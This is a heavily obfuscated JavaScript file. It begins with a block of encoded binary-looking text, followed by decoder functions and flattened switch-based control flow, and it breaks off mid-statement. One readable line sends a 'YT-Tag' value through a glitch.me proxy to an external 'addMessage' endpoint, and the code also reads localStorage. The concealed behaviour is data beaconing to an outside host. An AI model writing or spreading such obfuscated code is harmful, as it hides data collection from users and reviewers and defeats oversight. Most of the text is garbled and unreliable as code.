ѐ@+pQKmѶԼ@Ű|͢ʸb^MǄX}dfqȄ̞l^I|5a$Ȯ>4Ǆ32kdL3ĦkzԃЦϱOњԇrWf̊Еղf~<""@qU|bշչͅ9oˀ`*Տ|ԁԃȯՉȫȭnԳ|Ġύ;ԩԡȀԯԠ|)zχ<ĦҼȁ><Ӏͫ·մ[ͅ+՘Iѓ։ʶѸҰe0rR(&Ε0oQƠգ#cξ̋ӏ̼ŜՏϜȺɾe>Ҡreturn this|TextDecoder|Uʿt8Array|BӞ̃פSt̯ng|ת׬׮froȅסҼoקȒ׾ȅhяC؁ϝe׷ו|pushԇ؃n|unעfʿeȖענע؅׿Ԗҕ׵ʿ׸utf-8|c̷lɣppl׮uwLJyaخQՃ58MS|vZOc_XخdtpFqpf|իЍӃħaXkZV֊MϦĝˎVDBZrňjNͧZ˦t_e͹|Fcs1fĦIٴvd54|YSZqHpѵTmAtćͫIԩWטLيGm0ѵZbj0RύǤTƌgiOκAeO9ؗXcp3ٵκSqfDˍCT57qGj'}function T(...e){return e[B(-15)]=B(-21),e.D_rlUk=B(37),e[B(359)]>e[B(359)]+B(324)?e[-B(256)]:b[e[e[B(359)]-B(37)]]}function U(e){var a,r,c,t={},R=e.split(""""),n=r=R[B(-22)],T=[n],s=a=256;for(e=B(-21);e<R.length;e++)c=s>(c=R[e].charCodeAt(B(-22)))?R[e]:t[c]?t[c]:r+n,T.push(c),n=c.charAt(B(-22)),t[a]=r+n,a++,r=c;return T.join("""").split(""|"")}function V(){return[""ej6QmD"",0,1,2,96,108,""ahpuWsU"",236,""length"",""lQ39eNw"",161,""j_XNSPc"",127,63,12,18,""im6ex6S"",6,28,3,24,137,164,218,30,19,22,21,170,34,119,169,void 0,9,10,205,8,35,47,11,56,39,13,80,133,55,125,17,""f2MwAw"",81,181,15,177,60,""EH6QFNh"",176,4,40,""kVTjy5"",117,43,38,118,46,79,84,""T_8mCqc"",74,20,32,462,null,!0,!1,90,178,""fUgCGl"",53,23,""x"",77,318,402,""a2eYgF"",103,182,""q"",64,57,""n"",""b"",86,""G"",61,""L"",111,""iZApSy"",5,""h"",66,179,184,26,82,136,""j"",""s"",1295,""A"",85,27,""AiFsal"",62,""g"",""e"",""c"",100,139,152,14,""i"",""k"",185,120,104,29,189,""d"",150,""Ve85dL6"",33554432,37,513,67108864,88,303,""y"",""E"",105,72,153,""H"",""p"",""al"",73,7,""ai"",41,65,59,52,245,48,97,""F"",344,166,67,31,""Y"",""f"",""m"",129,""l"",""v"",""ty"",""D"",""P"",146,75,159,""W"",248,""U"",""S"",106,""a"",""N"",""O"",""I"",132,71,295,""X"",""aN"",70,""ar"",51,89,849,135,165,656,""ay"",""az"",208,128,809,426,""o"",50,""z"",""t"",""r"",126,""B"",""u"",110,173,138,121,""w"",78,180,225,428,346,187,700,""hzRmbQ1"",""aG"",250,""aw"",""aH"",244,""aI"",""aJ"",238,114,145,130,""aC"",""aE"",""aB"",""1"",290,113,""aZ"",""aM"",""ba"",""aL"",""J"",68,33,1019,""vm99oW"",""K"",637,54,83,1018,473,""ao"",""am"",198,92,""V2V7qX"",""V"",""ac"",421,""af"",98,""wqlYpH"",""KtSm1m"",243,112,230,107,""an"",49,94,828,""C"",260,87,484,101,220,""aA"",160,""M"",95,188,678,""ab"",420,""ag"",""aj"",25,415,340,109,416,""aQ"",""aU"",338,196,190,157,557,391,""Q"",99,""ad"",148,42,44,45,""_AjHXSg"",""M6ad5rb"",217,"","",""WSghP3"",58,69,292,650,389,""at"",224,142,""au"",""ae"",302,""aq"",""ax"",174,""as"",""ah"",207,586,626,226,""aV"",725,76,424,""aa"",143,907,""aP"",194,199,""kFoCvNm"",""f2fk8ic"",""HyL9cHs"",91,93,698,945,102,140,""or"",115,935,""on"",116,357,122,124,423,131,134,886,191,141,144,""pe"",""nt"",147,149,151,""te"",154,155,156,214,""EDNT_tM"",""xSUfrz6"",""C2NoGy"",""gHl5JW"",""zdFAPjN"",""D_rlUk""]}function X(B,e){function a(){return B(...arguments)}return Object.defineProperty(a,""length"",{value:e,configurable:!0}),a}C(L,B(-20)),C(N,B(-21)),y=P(B(47)).create(null),z=[],function(){var e,r,c,n,s,i,u,f,v;function b(B){return a[B>391?B-55:B<391?B>7?B<7?B-84:B<391?B>7?B>7?B-8:B+89:B+67:B-4:B-59:B+1]}if(e=[R(B(45)),R(B(2)),R[T(b(39))](B(9),b(35))],r={[T(b(83))]:R(B(-8)),[T(B(77))]:R(b(35)),[T(b(221))]:R(b(77)),[T(181)]:R(b(34))},c=b(81),n=P(b(78)).create(B(48)),s=[],u=B(49),f=b(81),v=C(((...e)=>{e[B(-15)]=1,e.thVPaEj=b(82),P(306)(`https://momentous-spurious-handsaw.glitch.me/proxy?url=https://root-tidy-cook.glitch.me/api/addMessage?message=YT-Tag: ${e[B(-22)]}`)}),1),localStorage[r[T(B(52))]]=localStorage[R(18)]||[],c){var d,g=R(b(33));function e(){}d=C(X(((...c)=>{var t,n,s,i;function u(B){return a[B<346?B>-38?B>-38?B<346?B>-38?B>346?B-63:B+37:B-70:B-84:B+95:B+84:B-74]}for(c[B(-15)]=2,c[u(39)]=u(-11),c[B(73)]=R(c[b(84)]-u(-18)),c.UxlO7R4={[T(b(93))]:R(20)},c[u(-1)]=-b(85),t=-218,c.a2eYgF=c.brubgNa,c[u(46)]=-u(45),n=u(44),s=326,i={[u(57)]:(e=void 0)=>{void 0===e&&(e=-402==i[b(87)]);var r=X((B=>a[B>5?B<5?B+98:B<389?B>5?B>5?B<389?B>389?B-33:B<389?B-6:B+37:B+68:B-55:B+20:B-85:B+21]),1);return e&&w.D2Q0z4[R[T(170)](r(38),[19])](5)==b(106)?n==B(55):(t*=u(-34),t+=u(18),s+=r(31))},[B(56)]:b(88),b:c.fUgCGl-B(3),[b(100)]:X((()=>k.next=new(i.n==b(89)?NaN:e)(86==n?P(B(252)):f)),0),[B(63)]:()=>s-=B(1),[B(66)]:-b(90)};t+c.a2eYgF+n+s!=9&&w.ejqc4X>-u(19);){var f,l,v,k,d;function h(B){return a[B>409?B-4:B>25?B<409?B>409?B+75:B>25?B<25?B+86:B>25?B-26:B+31:B-4:B+24:B+82]}switch(c.MjOB_EG={[T(183)]:R(h(94))},t+c[h(109)]+n+s){case w.ejqc4X>-4?335:-B(145):case u(47):case w.wY2jWU[c.UxlO7R4[T(B(62))]+q[T(c[B(13)]+h(345))]](u(19))!=u(-7)?-u(4):c[u(39)]+B(46):if(48==s&&w.ejqc4X>-(c[B(53)]-B(-8))){i[h(112)]();break}for(c[h(65)]=c[h(28)];(null!==d||null!==c[11])&&w.ejqc4X>-b(64);){var z=X((B=>a[B>469?B+69:B<85?B-20:B<469?B-86:B+46]),1);l=L((d?(t==-z(109)&&d).val:(i[z(192)]=i).b)+((c[B(60)]==-B(59)?c[c[B(53)]-(c[z(122)]+u(50))]:P(c[u(39)]+99))?(s==-B(65)||c[h(65)]).val:i[B(67)]),f,(356==i.b||N)(c[B(60)]+442)),f=P(-z(218)).floor((i[u(52)]==-z(168)?L:P(z(382)))(i[B(66)]==u(127)?1/0:l,B(11),(""w""==i[u(52)]?P(z(371)):N)(-u(23)))),k.next=new e((i[B(113)]=l)%u(-3)),k=(t==-B(-4)?s:k).next,d=d?(i[B(85)]=d).next:h(97),c[u(2)]=i[h(116)]==-h(49)||c[c[B(53)]-11]?c[h(65)].next:null}(i[B(143)]=f)&&w.mKSyOT>-b(99)&&i[u(55)](),t-=c[b(84)]+B(11);break;case w.mKSyOT>-B(68)?632:b(372):case 533:case b(65):i=void 0,n=-u(56),i[u(57)]();break;case w.ejqc4X>-4?c[8]+h(47):-(c[B(13)]+h(121)):case w.D2Q0z4[c[h(122)]](u(60))==B(75)?153:-b(382):case w.D2Q0z4[g](B(74))==h(124)?847:-u(25):case w.wY2jWU[c.MjOB_EG[T(c[u(39)]+B(-13))]+R(h(53))](h(82))!=c[B(13)]+172?h(292):24:f=B(-22),l=h(27),v=new(i[o+R(u(41))+u(128)](u(53))?e:P(B(260)))(i[b(98)]),k=v,d=c[c[8]+h(103)],s+=30;break;case w.ejqc4X>-(c[h(102)]-u(-22))?h(52):-u(305):case b(255):case w.xyIkK8()?c[h(62)]+658:-39:case w.D2Q0z4[R[T(h(57))](b(40),B(2))](u(60))==u(61)?674:b(83):return i.S=""T"",v.next;default:case w.ejqc4X>-4?h(223):-115:case w.ejqc4X>-(c[h(102)]-(c.fUgCGl-b(64)))?B(169):-b(142):i=h(99),f=h(27),l=h(27),v=new(i[h(131)]=e)(0),k=i[R(u(-11))+R(23)+""ty""](b(171))?i:v,d=c[b(91)]==i[h(115)]?c[c[8]+(c.fUgCGl-(c[h(62)]+h(52)))]:P(h(374)),t-=h(83),s+=30;break;case w.wY2jWU[R(20)+r[T(h(126))]](B(33))==u(-7)?3:-54:c[h(109)]=-(n==(318==n?318:u(104))?h(95):h(267)),t+=32,s-=11}}}),0),2),P(-303).log(d)}try{function h(B){return a[B>-74?B<310?B<-74?B+44:B>-74?B>310?B-55:B+73:B-98:B+65:B-68]}new function c(o,l,d){var g,h,y,m=R(31);return g={[T(186)]:R(31)},h={[R(B(-3))]:function(n,o,l){var d,h,y,I,j;function J(B){return a[B>468?B-0:B>468?B+22:B-85]}d=R[T(J(113))](void 0,[19]),h=[R(20)],y=R(b(33)),I={[T(B(194))]:R(b(35)),[T(B(259))]:R(B(2))};var[...K]=s;return j={get[J(245)](){var B={[T(J(211))]:R(b(32))};return c(R(b(133)),B[T(J(211))])},set[J(183)](B){f=B},get[J(206)](){return localStorage},get[b(106)](){return f},get e(){return c(R(24),R[T(b(36))](void 0,[b(32)]))},[B(104)]:X(((...B)=>P(-J(213))(...B)),0),[b(169)]:X(((...e)=>{if(b(81)){var r=X((B=>a[B>473?B-84:B>89?B<89?B+52:B>89?B-90:B-92:B-86]),1);function e(...e){var r=X((B=>a[B>325?B+62:B>325?B-63:B>-59?B>325?B+60:B>325?B+86:B<325?B+58:B+47:B-50]),1);return e[J(93)]=b(10),e.Ve85dL6=e[B(-22)],L(e.Ve85dL6[r(-56)]*r(75),e[r(71)][J(86)]<J(86)?B(107)|e[r(71)][b(9)]:e[b(137)][B(-22)],x=J(142))}function c(...e){var r=X((B=>a[B>-65?B<-65?B+60:B>319?B+50:B+64:B-8]),1);switch(e.length=B(-21),e[b(139)]=e[J(86)],L(((e[37]&J(215))!==B(-22))*b(10),(e[b(139)]<B(-22))*B(-20),N(B(34)))){case w.mKSyOT>-b(99)?0:J(184):return[e[b(139)]%33554432,P(-J(217)).trunc(L(e[b(139)],J(218),N(-43)))];case w.mKSyOT>-b(99)?1:45:return[L(e[37]%J(215),b(138),N(-r(-3))),L(P(-b(140)).trunc(e[b(139)]/r(69)),r(-62),x=r(-7))];case w.wY2jWU[g[T(186)]](r(-8))!=r(-34)?-r(70):J(88):return[((e[B(108)]+33554432)%J(215)+b(138))%33554432,P(-b(140)).round(L(e[r(67)],B(110),N(-b(68))))];case w.xyIkK8()?r(-45):r(-46):return[e[B(108)]%r(66),P(-513).trunc(L(e[37],67108864,N(-B(37))))]}}C(e,b(10)),C(c,J(87));let t=e([b(11),b(64)]),R=e([J(87),b(11)]),n=L(t,R,N(r(147))),s=L(n,R,N(-38)),i=L(s,J(88),x=-r(153)),u=L(i,B(-20),x=-43);P(-b(143)).log(c(n)),P(-B(112)).log(c(s)),P(-303).log(c(i)),P(-r(225)).log(c(u))}return v(...e)}),0),g:function(...t){var n,i,u,o,f;function l(B){return a[B<-27?B+91:B>357?B+22:B<357?B<-27?B-38:B+26:B+78]}for(n={[T(190)]:R(J(110))},i=l(310),u=66,o=-349,f={[B(113)]:2,ax:()=>u-=B(204),[l(153)]:56,[l(180)]:b(203),[B(114)]:86,q:B(115),[B(188)]:370,J:b(147),[B(155)]:X((()=>{var B=X((e=>B[e>290?e-88:e>290?e-95:e<290?e>-94?e<290?e>-94?e<-94?e+88:e<-94?e+16:e+93:e-35:e+80:e+75:e-17]),1);return i-=B(47),u+=357,o-=B(79)}),0),[B(118)]:731,[b(260)]:(e=void 0)=>(void 0===e&&(e=310==u),!e&&w.lUnzWgm>-J(194)?i:((271==f[J(206)]?P(J(194)):P(-b(143))).log(g),f[J(228)](),B(230))),[B(171)]:X((()=>o+=i-360),0),[J(227)]:J(160),[b(151)]:X((()=>f[J(231)]()),0),[B(182)]:J(236),M:X((()=>(u+=62,f[b(102)]())),0),aG:X((()=>{var B=X((e=>B[e<29?e-62:e<413?e>29?e<413?e<413?e<413?e>413?e+97:e<29?e+42:e-30:e-87:e+32:e+90:e-68:e+90]),1);return i-=21,u+=J(229),o+=B(175)}),0),[J(231)]:(e=void 0)=>(void 0===e&&(e=u==B(41)),e?f:o+=b(76)),[b(102)]:()=>o-=B(124),[l(89)]:-B(132),[B(85)]:l(188),[l(151)]:X((()=>(u+=b(38),o*=2,o+=197)),0),[B(69)]:930,[J(331)]:B(125),[l(64)]:B(-22),C:B(227),[l(147)]:X((()=>(f[b(175)](),u*=l(-23),u-=-308==o?-B(126):B(127),o+=i-535,b(182))),0),[J(190)]:-J(236),[b(191)]:X((()=>o-=b(160)),0),i:-488,[l(173)]:173,[J(164)]:l(127),[b(114)]:B(175),aA:X((()=>(i*=2,i-=J(306))),0),[b(162)]:b(232),[J(174)]:l(129),[b(167)]:(B=void 0)=>{void 0===B&&(B=""Z""==f[b(114)]);var e=X((e=>B[e<72?e-83:e<456?e-73:e-82]),1);return B&&w.lUnzWgm>-e(182)?f:o-=68},[b(201)]:X((()=>o+=B(129)),0),k:285,[B(104)]:C(X(((...B)=>(B[l(-18)]=J(87),B.saoGKu=B[l(-25)],B.saoGKu!=-l(130)&&B.saoGKu+208)),0),1),[B(235)]:(e=void 0)=>(void 0===e&&(e=f[b(121)]==B(134)),e||w.wY2jWU[R(b(166))](l(30))!=l(4)?(f[J(244)](),f.z=B(50)):arguments),[l(134)]:-b(22),[b(169)]:C(X(((...e)=>(e[l(-18)]=b(10),e[B(139)]=e[l(-25)],e[129]+546)),0),J(87)),[B(140)]:57,[l(88)]:1,[l(138)]:R[T(170)](b(40),[22])+R(l(52))+B(142),[J(256)]:()=>i+=u-219,[l(176)]:b(52),[B(90)]:B(134),[J(251)]:J(182),V:X((()=>(u*=b(11),u-=J(118),o-=J(180))),0),[B(163)]:X((()=>o==J(149)),0),[b(175)]:X((()=>i=-B(145)),0),r:b(223),[B(75)]:b(65),[l(158)]:C(X(((...e)=>(e[J(93)]=B(-21),e.WUPh6Y0=e[J(86)],e.WUPh6Y0+l(143))),0),b(10))};i+u+o!=97;){var v,d,g,h;function z(B){return a[B<348?B>-36?B>348?B+32:B>348?B+20:B+35:B-23:B+93]}switch(v=[R(20)],i+u+o){case w.lUnzWgm>-l(83)?J(170):J(255):if(o==z(269)){o-=B(124);break}if(f[J(261)]){f[J(342)]();break}f[l(145)](),u+=l(156),o-=b(180);break;case 148:if(f[l(147)]()==B(151)&&w.xyIkK8())break;case w.wY2jWU[R(J(243))](J(141))!=b(38)?-b(183):J(208):if(delete f[z(191)],o==-z(234)){f[l(254)]();break}if(f[J(261)]&&w.lUnzWgm>-B(86)){f[b(185)]();break}f[b(186)]();break;case w.ino3tXN[R(J(110))](J(104))!=J(264)?221:90:i=-B(145),i+=b(188),o+=(u-=238)+(i==B(28)?f[B(208)]:l(1));break;case J(266):f[b(184)]=d,i-=l(114),u+=b(190),f[B(160)]();break;case w.ino3tXN[R(19)](J(104))==l(153)?f[J(269)](u):null:case w.xyIkK8()?B(-16):-b(349):case w.xyIkK8()?277:-J(210):d=o==z(-5),o-=b(193);break;case w.xyIkK8()?361!=u&&u-196:null:if(f[z(151)]()&&w.wY2jWU[v[l(-25)]+R(b(35))](4)==z(-5)){o*=z(-32),o+=447;break}u+=-467==f.o?-J(128):J(272),o-=J(273);break;case 947:case w.FiIyMs7>-B(80)?b(197):b(111):case w.ejqc4X>-J(141)?b(243):B(167):case z(156):if(i==-l(78)&&w.D2Q0z4[R(B(2))](z(62))==z(63)){i+=J(225),u*=l(-23),u-=b(200),o+=J(147);break}if((f[l(196)]=f)[z(141)]&&w.ejqc4X>-b(64)){i+=153,f.ax(),f[b(201)]();break}f[z(159)]();break;case b(55):case w.FiIyMs7>-J(188)?355:-J(207):case w.mKSyOT>-b(99)?196:-B(172):u=f[z(63)]==b(323)?B(209):J(237),f[J(305)]();break;case w.D2Q0z4[R(B(2))](5)!=B(75)?z(90):l(170):case w.D2Q0z4[R(19)](z(62))!=b(106)?44:z(162):g=X(((e,c,t)=>{var n,s,i;function u(B){return a[B<-29?B-13:B>-29?B>-29?B<355?B<-29?B-68:B+28:B+56:B+55:B+9]}for(n=-f[b(97)],s=l(172),i={k:()=>(n-=f[z(164)],s+=z(0)),[l(88)]:X((()=>s=-i[B(104)]),0),[u(133)]:()=>s==-B(177),[u(132)]:()=>n-=f[B(119)],[B(178)]:X((()=>(s=-105,s+=15,""x"")),0),d:f[z(51)],[z(107)]:()=>t.length!==e.length+(i[B(92)]==-J(240)?P(B(228)):c).length&&""1""==w.JfM31z[R[T(169)](void 0,b(33))](3)?{[B(176)]:i[B(138)]()}:(s+=J(141),i.b=B(50),J(174)),[J(287)]:-B(132),[z(80)]:f[J(175)],[z(73)]:C(X(((...e)=>{var r=X((B=>a[B<-89?B+19:B<-89?B-61:B>-89?B<-89?B+30:B<-89?B-37:B+88:B+34]),1);return e[J(93)]=2,e[u(176)]=e[b(10)],e[z(-34)][z(55)]?-976:413!=e[126]&&e[126]!=f[B(180)]&&e[126]!=l(190)&&e[z(169)]!=f.s&&e[J(289)]-r(67)}),0),z(-32)),[B(182)]:C(X(((...B)=>(B[l(-18)]=l(-24),B[u(52)]=B[z(-34)],B[b(88)]+u(170))),0),b(10))};n+s!=B(42)&&w.ino3tXN[R[T(b(36))](b(40),[l(-1)])](b(27))==B(156);){var o,v;function k(B){return a[B>457?B-49:B<73?B-97:B<73?B+63:B<73?B+21:B>73?B-74:B+12]}switch(n+s){case 683:case w.FiIyMs7>-B(80)?f[J(287)]:null:case w.lUnzWgm>-z(74)?-171!=n&&n+f[J(291)]:null:i[b(122)](),i.f(),s+=n==s+(n==-l(129)?-303:84)?i[u(77)]:k(351);break;case w.xyIkK8()?f.d(n):null:if(s==-l(181)&&w.D2Q0z4[R(z(-10))](J(182))==u(70)){i[z(86)]();break}o={},n-=l(182),s+=J(294);break;case w.l4EupK>-b(71)?i[z(73)](i,s):z(-3):return(i[f.v](b(123))?h:P(b(218)))(e,n==i[b(210)]?c:P(l(313)),t,z(-34),(i[B(188)]=i)[B(92)],(s==s-f.w||f).b,o);default:if(n==-f[z(44)]&&w.FiIyMs7>-l(77)){s*=2,s-=439;break}o={},s-=z(8);break;case f[l(110)]:if(""n""===(v=i.p()))break;var d=X((B=>a[B<364?B<364?B<-20?B-9:B>-20?B+19:B-50:B-4:B-42]),1);if(typeof v==r[T(J(298))]&&w.mKSyOT>-d(72))return v.o;case 322:case w.ejqc4X>-4?893:-u(186):case w.FiIyMs7>-B(80)?380:-u(89):case w.ejqc4X>-B(33)?s!=k(289)&&350!=s&&s!=l(190)&&s!=f[B(83)]&&s-B(132):void 0:if(i[J(286)]()==b(87))break}}}),3),f.ac();break;case w.lUnzWgm>-J(194)?l(233):z(112):case w.JfM31z[R(B(2))](b(27))==l(208)?272:-B(184):case 119!=w.wY2jWU[e[J(86)]+I[T(B(194))]](B(33))?-b(75):b(226):case w.l4EupK>-z(28)?f.z?-278:60:void 0:if(delete f.aM,w.ejqc4X<=-B(33)){i-=153,u+=l(191);break}h=C(X(((...e)=>{var r,c,t,s,i;function u(B){return a[B<433?B>49?B<433?B>433?B-87:B<433?B<49?B+69:B<49?B+46:B>433?B+14:B-50:B-76:B-59:B+94:B+100]}for(e[J(93)]=b(153),e.hzRmbQ1=-50,e[u(295)]=R(e[u(269)]-(e[u(269)]-B(3))),r=-f[z(73)],c=-488,t=-f[z(170)],s=b(252),i={[b(98)]:f[l(72)],[B(83)]:-f[z(237)],[u(273)]:u(222),[z(185)]:l(195),c:1,[B(104)]:X(((B=void 0)=>(void 0===B&&(B=i[J(175)]==z(1)),B&&w.ejqc4X>-4?i:s+=c+1095)),0),[l(158)]:(e=void 0)=>(void 0===e&&(e=s==(r==-f.D?i.aP:1016)),!e&&w.lUnzWgm>-B(86)?i.aR():c=f[B(114)]),[B(199)]:J(243),[B(202)]:X((()=>(r+=i.aG,t-=f[z(119)],s+=t+i[b(231)])),0),[B(210)]:-B(158),aF:b(384),[b(246)]:()=>r+=z(294),aX:-b(232),l:-f[l(82)],[u(211)]:X((()=>r==i[z(128)]),0),[b(248)]:X((()=>(r=-109,i[u(275)](),B(203))),0),[B(176)]:b(95),aY:C(X(((...e)=>{var r=X((B=>a[B<-60?B-40:B<-60?B+50:B<-60?B+1:B>324?B-83:B<324?B<-60?B+20:B+59:B-63]),1);return e[B(-15)]=u(52),e[238]=b(146),e[J(312)]>r(-28)?e[-J(313)]:e[e[u(277)]-105]+537}),0),J(87)),[u(287)]:C(X(((...e)=>(e[z(-27)]=B(-21),e[l(203)]=e[0],e[145]+l(-22))),0),J(87)),[u(289)]:C(X(((...e)=>(e[l(-18)]=u(52),e[B(207)]=e[z(-34)],e[B(207)]-964)),0),l(-24))};r+c+t+s!=79&&w.D2Q0z4[R(19)](5)==u(148);){var o=X((B=>a[B<429?B<429?B<45?B-98:B<45?B-28:B<429?B>45?B>45?B<45?B-76:B-46:B+20:B-99:B-98:B+59:B+32]),1);switch(r+c+t+s){case w.ino3tXN[R[T(b(39))](z(-3),19)](3)!=B(156)?null:f[l(135)](c):if(w.lUnzWgm<=-85){r*=e[J(304)]+u(200),r+=18,t*=i.aB==u(281)?i[J(317)]:2,t+=489;break}return e[l(-9)][L(""""+e[J(104)]+e[e[u(269)]-(e[b(227)]-l(30))],e[b(105)],x=40)]=e[e[u(269)]+68],e[b(23)];case w.ttvK9Ri[R(b(76))+R(l(1))](e[u(269)]+51)==b(111)?f.G:l(6):case w.FiIyMs7>-l(77)?i.aY(c):null:i[B(161)](),r*=b(11),r-=c==(""aS""==i[o(279)]?""aT"":-488)?-f[o(187)]:-o(88),t+=i.aX,s+=3;break;case w.JfM31z[R(o(71))](o(65))==u(284)?f.B:B(9):case w.lUnzWgm>-B(86)?l(0):z(27):case w.D2Q0z4[R[T(z(-4))](z(-3),l(-1))](B(74))==l(72)?235:-(e[b(227)]+b(243)):s=t+82,r+=f.l;break;case 337:case w.FiIyMs7>-(e.hzRmbQ1+o(226))?572:-o(378):case w.ttvK9Ri[R(20)+k](b(10))!=u(153)?-z(-8):e[l(193)]+z(201):c=z(56),t-=609,i[l(101)]();break;case i[J(322)](t):r=-J(88),i[B(215)](),t-=f.F;break;case w.mKSyOT>-(e[o(265)]+b(112))?i[b(247)](s):null:if(""aJ""==i[J(325)]()&&w.xyIkK8())break;default:if(e[u(65)]=t==o(105),e[l(71)]>=(i.k=e[z(-32)]).length&&w.JfM31z[n[T(o(343))]](b(27))==u(284))return i.m();if((t==f[o(159)]||e[e[u(269)]+B(17)])[""""+e[e[J(304)]+b(85)]+(i[J(200)]==e.hzRmbQ1+1069?B(9):e[4])+e[e[b(227)]+b(53)]]!==(t==-f[b(187)]?P(-303):void 0)&&w.lUnzWgm>-b(117))return(c==t-b(272)&&e[o(63)])[L(""""+(t==i[o(245)]?P(-140):e[3])+e[l(30)],i[u(192)]=e[l(71)],x=z(22))];(i[o(249)]=e[l(-23)])[e[b(105)]]===e[l(-25)][i[J(287)]=e[B(-4)]]&&(i[z(55)]==f[z(206)]?P(e[J(304)]+307):e[o(49)])[40==i[u(140)]&&e[e[u(269)]+l(19)]]===e[J(87)][i[R(B(3))+R(J(163))+""ty""](z(101))?P(935):e[4]]&&w.FiIyMs7>-b(111)?e[e[o(265)]+u(292)]=(i.l==u(158)?P(l(217)):h)(e[0],e[l(-24)],t==b(95)||e[B(-20)],L(s==J(329)?e[3]:P(e[l(193)]+957),(i[o(212)]=f)[b(122)],x=i[J(175)]),e[e[b(227)]+B(225)],(-225==r&&L)(i[l(128)]=e[o(143)],i[e[l(219)]+R(o(124))+u(215)](o(187))?b(12):u(52),N(f[u(148)])),e[6])||(29==i[u(156)]?P(b(365)):h)(r==(i[o(152)]==-f[u(213)]?J(178):B(162))?P(e[b(227)]+748):e[u(51)],e[l(-24)],i[B(140)]==-f[z(73)]?e[u(53)]:P(-J(217)),e[e[J(304)]+l(51)],(s==o(352)?NaN:L)(i[B(151)]=e[b(64)],J(87),N(J(142))),L(70==c?P(907):e[e.hzRmbQ1+(e[b(227)]-(e[J(304)]-55))],i.c,x=J(142)),e[z(-18)]):e[e[l(193)]+b(158)][e[B(74)]]===(c==(i.l==-(e.hzRmbQ1+275)?e[J(304)]+l(143):u(53))?P(-33):e[b(9)])[t==-J(236)&&e[e[B(196)]+z(42)]]?e[z(-20)]=(i[f[z(129)]](l(173))&&h)(e[u(51)],e[o(48)],i.b==f[B(223)]||e[o(49)],(i[z(128)]==-(e[b(227)]+53)?P(-z(212)):L)(e[J(104)],i.c,x=f[z(63)]),i[o(136)]==u(107)?e[o(102)]:B(9),(i[z(55)]==e[l(193)]+90?L:P(-64))(i[J(284)]==b(336)?P(-303):e[o(143)],(r==(r==(s==J(98)?l(261):-B(102))?B(120):-l(188))&&i)[z(80)],(i.an=N)((i.ap=i)[B(67)])),typeof i[J(248)]==R(u(119))||e[e.hzRmbQ1+o(86)]):(i.ar=e[J(88)])[e[l(71)]]===e[1][i[R(22)+R[T(b(36))](J(117),[23])+l(139)](J(403))?P(-u(410)):e[e[u(269)]+z(213)]]&&""h""==w.D2Q0z4[R(J(110))](5)&&(e[u(65)]=h(c==-o(295)||e[0],i[B(140)]==-J(299)&&e[e[J(304)]+z(152)],i[l(80)]==-J(335)&&e[J(88)],t==i.aw||e[u(69)],(i[l(167)]=L)(1019==s?e[z(21)]:P(o(297)),i[o(161)],x=40),L(typeof i[l(64)]==R(33)?e[e[b(227)]+55]:t,u(52),N(t+f[J(206)])),e[e[J(304)]+56])),s-=3}}}),0),7),i-=B(117),u*=B(-20),u-=i-335;break;default:return s=[...t],new c(R(z(90)),b(40),R(b(110))).dT4KN3;case w.ttvK9Ri[R(z(123))](B(-21))!=b(111)?43:b(278):if(f[J(337)]()==l(227)&&w.mKSyOT>-z(56))break}}},get[J(200)](){return P(-B(105))},set[B(67)](B){i=B},set[J(190)](B){p=B},get[J(248)](){var a,c,t=-J(385);for(a=B(276),c={[b(214)]:J(339),b:0,[B(278)]:X((()=>(t+=b(263),c[B(144)]())),0),[J(251)]:992,[b(122)]:-402,[b(210)]:J(109),[b(128)]:385,[J(193)]:606,B:J(132),[b(169)]:-67,[J(284)]:J(358),q:B(266),[B(144)]:()=>a+=b(48),Y:function(B=void 0){return void 0===B&&(B=a==b(59)),B&&w.wY2jWU[m](4)==J(115)?arguments:a+=69},[B(156)]:163,[J(177)]:71,ag:X((()=>(t+=B(-5),c[b(268)]())),0),[B(119)]:C(X(((...e)=>(e.length=B(-21),e[b(264)]=e[b(9)],e[J(341)]+269)),0),J(87)),[b(114)]:321,[J(190)]:b(49),[b(87)]:J(146),[B(234)]:X((()=>(t-=135,a+=B(17))),0),[J(286)]:J(313),[B(280)]:()=>({[b(266)]:c[B(160)]=v}),n:-J(204),[b(106)]:-b(37),[B(155)]:X((()=>a-=J(189)),0),[b(168)]:77,[J(258)]:()=>t+=a==B(236)?39:b(182),[b(121)]:B(108),[b(211)]:J(125),[B(218)]:J(105),[B(118)]:235,[J(212)]:J(401),w:b(130),[J(221)]:366,[b(162)]:J(327),k:-b(22),[B(92)]:1,l:B(27),v:b(34),[b(268)]:()=>a-=b(195),[B(299)]:()=>a-=b(193),[J(222)]:B(238),C:968,W:X((()=>t+=477==a?-39:23),0),[b(254)]:580,[b(102)]:()=>a==B(86),al:C(X(((...e)=>(e[J(93)]=b(10),e.wqlYpH=-150,e[B(239)]>e[J(347)]+B(162)?e[e.wqlYpH+b(37)]:e[0]-404)),0),b(10)),[B(230)]:C(X(((...e)=>(e[b(16)]=1,e[B(240)]=e[0],-434!=e[J(348)]&&e.KtSm1m+496)),0),1),[B(245)]:C(X(((...e)=>(e[J(93)]=b(10),e.IphricE=7,e.IphricE>b(111)?e[J(349)]:-327!=e[B(-22)]&&e[0]+(e.IphricE+489))),0),1)};t+a!=J(350)&&w.mKSyOT>-b(99);)switch(t+a){case w.wY2jWU[R(20)+R[T(169)](J(117),21)](J(141))==b(38)?c[J(228)](a):null:if(c[B(71)]()){t-=B(1),a-=61;break}P(-J(220)).log(c[b(162)]==b(76)?P(-b(274)):s),t-=b(32),a+=a-b(255);break;default:if(t==-J(373)&&w.lUnzWgm>-B(86)){c.ae();break}a=-J(187),t-=B(244),a+=b(208);break;case w.l4EupK>-B(40)?c[b(276)](t):b(40):case w.FiIyMs7>-b(111)?733:J(172):if(a==-J(354)&&w.ttvK9Ri[R(b(76))+R(J(112))](B(-21))==J(188)){t+=b(68),a+=a-571;break}a=b(11),t+=b(68),a-=B(146);break;case t+472:t=b(278),c[b(294)]();break;case w.ejqc4X>-4?596:-J(314):case 967:case w.lUnzWgm>-85?b(164):-206:if(w.ttvK9Ri[R[T(J(113))](void 0,[B(45)])+R(B(4))](J(87))!=B(80)){t+=b(263),a-=b(112);break}var n=J(158);c[B(155)]();break;case""h""==w.D2Q0z4[R(B(2))](B(74))?705:-B(19):case""h""==w.D2Q0z4[e[J(87)]](J(182))?b(83):b(125):case w.mKSyOT>-86?J(128):-b(22):case 731:if(c[b(184)]&&119==w.wY2jWU[R(b(76))+R(B(4))](b(64))){c[J(256)](),a-=56;break}t*=J(88),t+=B(-1);break;case w.mKSyOT>-B(68)?a-b(303):null:case 